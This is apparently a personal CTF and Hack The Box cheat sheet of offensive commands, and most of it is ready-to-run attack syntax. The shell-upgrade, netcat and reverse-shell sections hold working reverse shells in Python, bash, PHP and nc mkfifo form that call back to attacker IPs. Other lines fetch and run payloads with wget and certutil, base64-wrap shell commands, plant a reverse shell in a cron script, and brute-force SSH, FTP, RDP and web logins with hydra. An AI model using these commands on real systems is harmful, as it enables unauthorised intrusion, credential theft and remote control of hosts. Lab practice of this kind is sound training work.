# Hackthebox

- ```find /  -perm -u=s -type f 2>/dev/null``` to see the permission
- `sudo -l`
  
## Find the flag file
  - ```find / -name local.txt 2> /dev/null```
  - `find / -iname user.txt -exec wc {} \;`
  - `find . -name user.txt -exec wc -c {} \; -exec cat {} \;`
  - `find / -iname root.txt -exec wc {} \;`
  - ``` find -type d -name ".*" 2>/dev/null``` it will check hidden directories.
- [Linux Forensics](/linux_forensics.md)
- [Useful_links](/links.md)
- [0. Service Port](/port.md)
- [1. Nmap](/nmap.md)
- [2. BurpSuite](/burpsuite.md)
- [3. Gobuster](#gobuster)
- [4. FFUF](#ffuf)
- [5. Nikto](#nikto)
- [6. Mysql](#mysql)
- [7. Cewl](#cewl) - It is use to create a worldlist using website link
- [8. SSH](#ssh)
- [8. Hydra](#hydra) - Brute force attack on ssh
- [9.FTP](#ftp)
- [10. shell upgreade](#shell)
- [10. Password Cracking](/hash_cracking.md)
- [11. RDP-3389](#rdp)
- [12. SMB](/smb.md)
- [13. Metasploit](/metasploit.md)
- [14. netcat](#nc)
- [15. Reverse_Shell_Script](#rev)
- [16. Privilege escalation](/Privilege.md)
- [17. Email Harversting with theHarvester](#email)
- [18. Simple Local Web Servers](#localweb)

# Windows
- [I. certutil](#certutil)
- [II. Mimikatz](/Notes/mimi.md)

# [1. Nmap](/nmap.md)

# [2. BurpSuite](/burpsuite.md)

# 3. Subdomain Enumeration With Sublist3r
- __`sudo apt-get install sublist3r`__
- __`sublist3r -d <domain name>` or `sublist3r -d <domain name> -e google,yahoo`__

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cyprusbank.thm/  -H 'Host: FUZZ.cyprusbank.thm' -fw 1
```

# 3. Gobuster <a name="gobuster"></a>
```
gobuster -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```
```
gobuster dir -u <url> -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://192.168.60.132 -t 50 -x php,txt -o  gobuster.txt
```

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.54.84 -t 100 -x .html,.txt,.php > gobuster.txt
```  





# 4. FFUF <a name="ffuf"></a>
- FFUF is used to filter the invalid pages 
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt```
- ```ffuf -u <url>/FUZZ -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -r -fs 27200```
  - if you are getting the size same of all use filter size and give the size there.
subdomain
```
ffuf -u http://test.com -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H ‘Host: FUZZ.test.com’ -fs 0 -fs 65
```

```
ffuf -u 'http://cyprusbank.thm/' -H "Host: FUZZ.cyprusbank.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -t 100 -ic -fw 1
```

```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://cyprusbank.thm/  -H 'Host: FUZZ.cyprusbank.thm' -fw 1
```






# 5. Nikto <a name="nikto"></a>
- ```nikto -h http://127.0.0.1```





# 6. Mysql <a name="mysql"></a>
- ```mysql -u root -p -h $ip```





# 7. Cewl <a name="cewl"></a>
- ```cewl -w passwords.txt http://192.168.245.48:1898/?q=node/1```





# 8. SSH <a name="ssh"></a>
- `nmap -A -T4 -p 22 --script ssh2-enum-algos 10.0.1.22`
- "encryption_algorithms" are supported by the SSH server
  - `nmap -T4 --script=ssh2-enum-algos 10.0.1.22`
- Getting ssh hostkey
  - `nmap -T4 --script=ssh-hostkey --script-args ssh_hostkey=full 10.0.1.22`
- Checking authentication for the user
  - `nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=student" 10.0.1.22`
- Fetching the flag from /home/student/FLAG by using nmap ssh-run script
  - `nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run,username=student,ssh-run.password=" 10.0.1.22`
- Finding the password of user “administrator” use appropriate nmap scripts with password dictionary: /usr/share/nmap/nselib/data/passwords.lst
  - `echo "administrator" > users`
  - `nmap -p 22 --script ssh-brute --script-args userdb=/root/users 10.0.1.22`
  - or `hydra -l administrator -P /usr/share/nmap/nselib/data/passwords.lst 10.0.1.22 ssh`
- using msfconsole
  - `msfconsole`
  - `use auxiliary/scanner/ssh/ssh_login`
  - `set RHOSTS 192.40.231.3`
  - `set USERPASS_FILE /usr/share/wordlists/metasploit/root_userpass.txt`
  - `set STOP_ON_SUCCESS true`
  - `set verbose true`
  - `exploit`
 
Downloading a file from a remote system.
- `scp user@10.10.10.10:/home/user/secret.zip .`



# 8. Hydra <a name="hydra"></a>
- `hydra -C <combinations.txt> <ip> <service>`
- ```hydra -l <username> -P /usr/share/wordlists/rockyou.txt <ipaddress> ssh -t 50```
- ```hydra -L users.txt -P passwords.txt ssh://192.168.245.48 -t 4 > hydra.txt```
- ```hydra -l root -P /usr/share/wordlists/rockyou.txt $ip mysql```
```
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 ftp
```
```
hydra -L/usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 ftp
```
### Hydra POP3 Brute Force
```
hydra -l admin -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 -s 4567 pop3
```
### Hydra RDP
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>
```
### Hydra SMTP Brute Force
```
hydra -P /usr/share/wordlists/rockyou.txt 127.0.0.1 smtp -V
```
### Hydra SSH Brute Force
```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 ssh
```
### Brute Forcing a Website Login
- Login page 
- http://127.0.0.0/DVWA/vulnerabilities/brute/index.php

- `hydra -l admin -P /usr/share/wordlists/rockyou.txt  127.0.0.1 http-post-form "/DVWA/vulnerabilities/brute/index.php:userField=^USER^:passwordField=^PASS^"`





# 9. FTP <a name="ftp"></a>

- `ftp  192.168.112.50 21`
```
hydra -L /unix_users.txt -P /unix_passwords.txt 192.168.112.50 ftp
```
```
nmap -Pn -A -p 21 -T4 --script=ftp-brute.nse --script-args userdb=/root/usr 10.0.1.22  -o namp
```
- ftp <ip>
  - user:anonymous
  - pass:
  - 230 Login successful
  - to upload a file use ```put <filename>```
  - to download a file use ```get <filename>```



# 10. shell upgrade <a name="shell"></a>

- __`python -c 'import pty; pty.spawn("/bin/bash")'`__

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.157",1235));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
- __`nc -lnvp 1235`__

- __This script, once triggered by the cron, connects back to my attacker machine using a reverse shell on port 31337.__
```
echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
```
- __`nc -lnvp 31337`__

# 10. [Password Cracking](/hash_cracking.md)






# 11. RDP-3389 <a name="rdp"></a>

- `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /user/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://<target ip> -s <target port>`

- `xfreerdp /u:administrator /p:qwertyuiop /v:<target> ip:<port_number>`

- __`search enable_rdp`__
```
use post/windows/manage/enable_rdp
set sesstion 1
exploit
```
- __now you can change the password for the user in my case i have access to the administrator account__
- __so i have meterpreter session running in the background__
- __so use `shell`__
- __change the password__
- __`net user administrator password123`__
- > you have change the password of the admininstrator so that we can login using `xfreerdp` into rdp using this login
- __`xfreerdp /u:administrator /p:password123 /v:<targetip>`__


# [12. SMB](/smb.md)



# [13. Metasploit](/metasploit.md)




# 14. netcat <a name="nc"></a>
```php
<?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
?>
```
```Bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```
```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<Your_ip>",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`
```
### If you have commands to enter then use the below scripts
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <Your_ip> 1234 > /tmp/f
```
```
wget 10.8.1.72/shell.sh && bash shell.sh
```
__Download the reverse shell in windows__
  - > __First we need to host the file in your kali linux__
    - __`cd /usr/share/windows-binaries/`__
    - __`python -m SimpleHTTPServer 80`__
  - > __Go to the target windows system type the below command in the `cmd`__
    - __`certutil -urlcache -f http://<attacker_ip>/nc.exe net.exe`__
  - > __run the below command in kali linux__
    > __`nc -nvlp 1234`__
  - > __we need to run the file in target system__
    - __`new.exe -nv <attacker ip> 1234 -e cmd.exe`__


# 15. Reverse_Shell_Script <a name="rev"></a> ---> (nc -lvnp 9001)
- [revshells.com](https://revshells.com)
- __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__
- __Sometimes you need to encode__
  - __`bash -c 'bash -i >& /dev/tcp/yourip/9001 0>&1'`__ __save this in tmp file__
  - __`cat tmp | base64 -w 0`__
  - __`echo <encoded_command> | base64 -d | bash`__
- __PHP reverse shell__
    - __`<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"); ?>`__
    - __`nc -lnvp 8082`__
 - __SHELL script__
 - __`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh`__
 - __`nc -lnvp 8083`__



# [16. Privilege escalation](/Privilege.md)



# 17. Email Harversting with theHarvester <a name="email"></a>
- __`theHarvester -d <domain name> -b google,linkedin,yahoo,dnsdumpster,duckduckgo,crtsh,rapdiddns`__





# 18. Simple Local Web Servers <a name="localweb"></a>

```
python -m SimpleHTTPServer 80
```

```
python3 -m http.server
```

```
php -S 0.0.0.0:80
```
# Windows 
## I. certutil <a name="certutil"></a>
- `certutil -urlcache -f http://10.1.23.11/revshell.exe revshell.exe`
- 
## [II. Mimikatz](/Notes/mimi.md)
